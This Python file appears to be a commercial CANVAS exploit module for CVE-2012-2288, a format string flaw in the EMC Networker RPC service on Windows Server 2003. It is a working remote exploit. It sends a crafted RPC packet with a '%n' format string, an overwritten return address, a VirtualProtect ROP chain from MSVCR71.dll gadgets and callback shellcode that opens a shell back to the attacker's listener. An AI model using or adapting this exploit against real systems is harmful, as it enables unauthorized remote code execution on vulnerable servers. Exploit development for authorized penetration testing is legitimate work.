#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
if '.' not in sys.path: sys.path.append('.')

import xdrlib
import canvasengine

from exploitutils import *
from tcpexploit import *
from canvasexploit import *

from MOSDEF import mosdef

NAME                              = 'EMC Networker format string exploitation'
DESCRIPTION                       = 'Exploit for EMC Networker format string bug'
DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = ""
DOCUMENTATION['Date public']      = ''
DOCUMENTATION['References']       = ''
DOCUMENTATION['Repeatability']    = ''
DOCUMENTATION['VersionsAffected'] = ''
DOCUMENTATION['CVE Name']         = 'CVE-2012-2288'
DOCUMENTATION['CVE Url']          = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2288'
DOCUMENTATION['CVSS']             = 0

VERSION                           = '1.0'
PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Remote'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['VERSION']               = ['2003']

DOCUMENTATION['Notes']            = """
http://blog.exodusintel.com/2012/08/29/when-wrapping-it-up-goes-wrong/
Tested on Windows Server 2003 Standard Edition
"""

CHANGELOG                         = """
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.version       = 0
        self.name          = NAME
        self.filename      = ''
        self.badstring     = "\x00\x25"
        self.subesp        = 0
        self.name          = NAME
        self.ip            = None
        self.port          = 55555

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def createShellcode(self):
        return self.createWin32Shellcode_universal(self.badstring,self.callback.ip,self.callback.port)

    def getArgs(self):
        self.port = int(self.getarg("port"))

    def rop(self):
        rop_gadgets = ""
        rop_gadgets += struct.pack('<L',0x7c35437d)	# POP EBP # RETN [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0x7c35437d)	# skip 4 bytes [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0x7c347f97)	# POP EAX # RETN [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0xfffffdff)	# Value to negate, will become 0x00000201
        rop_gadgets += struct.pack('<L',0x7c351e05)	# NEG EAX # RETN [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0x7c343860)	# POP EBX # RETN [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0xffffffff)	#
        rop_gadgets += struct.pack('<L',0x7c345255)	# INC EBX # FPATAN # RETN [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0x7c363cff)	# ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0x7c3458bc)	# POP EDX # RETN [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0xffffffc0)	# Value to negate, will become 0x00000040
        rop_gadgets += struct.pack('<L',0x7c351eb1)	# NEG EDX # RETN [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0x7c352c0a)	# POP ECX # RETN [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0x7c38e215)	# &Writable location [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0x7c34b8d7)	# POP EDI # RETN [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0x7c346c0b)	# RETN (ROP NOP) [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0x7c365f89)	# POP ESI # RETN [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0x7c3415a2)	# JMP [EAX] [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0x7c376223)	# POP EAX # RETN [MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0x7c37a140)	# ptr to &VirtualProtect() [IAT MSVCR71.dll]
        rop_gadgets += struct.pack('<L',0x1001DCE1)	# PUSHAD # RETN [LIBNSR.dll]
        rop_gadgets += struct.pack('<L',0x7c345c30)	# ptr to 'push esp #  ret ' [MSVCR71.dll]
        return rop_gadgets


    def sendRequest(self):
        MY_PROGRAM_ID = 0x5F3DD    # Program Number
        MY_VERSION_ID = 2
        MY_TIME_PROCEDURE_ID = 0x6 # Procedure Opcode
        AUTH_NULL = 0

        # send an Sun RPC call package
        p = xdrlib.Packer()

        p.pack_uint(0x70000094)
        p.pack_uint(0x0e61d6d4)
        p.pack_uint(0)
        p.pack_uint(0x00000002)

        p.pack_uint(MY_PROGRAM_ID)
        p.pack_uint(MY_VERSION_ID)
        p.pack_uint(MY_TIME_PROCEDURE_ID)
        p.pack_enum(AUTH_NULL)

        p.pack_uint(0)
        p.pack_uint(0)
        p.pack_uint(0)
        p.pack_uint(0)

        p.pack_uint(0x00000024)
        p.pack_uint(0x00000006)
        p.pack_uint(0x7a7a7a7a)

        p.pack_uint(0x7a7a0000)
        p.pack_uint(0x00000001)

        padding = "A" * 18
        shellcode = self.shellcode
        eip = "\x6b\x45\x34\x7c"
        rop = self.rop()
        fmt = "%n" * 150

        fmt += padding
        fmt += eip
        fmt += rop
        fmt += shellcode
        p.pack_string(fmt)

        buf = p.get_buffer()

        s = self.gettcpsock()

        try:
            s.connect((self.ip, self.port))
            s.send(buf)
        except Exception, ex:
            self.log('Error: %s' % ex)
            return 0
        finally:
            s.close()

        return 1

    def run(self):
        self.getArgs()
        self.ip = self.target.interface

        self.log('Sending RPC Request to %s:%s' % (self.ip, self.port))

        if not self.sendRequest():
            self.log('Failed')
            return 0

        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s' % (DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0, 1, None]:
        ret.interact()

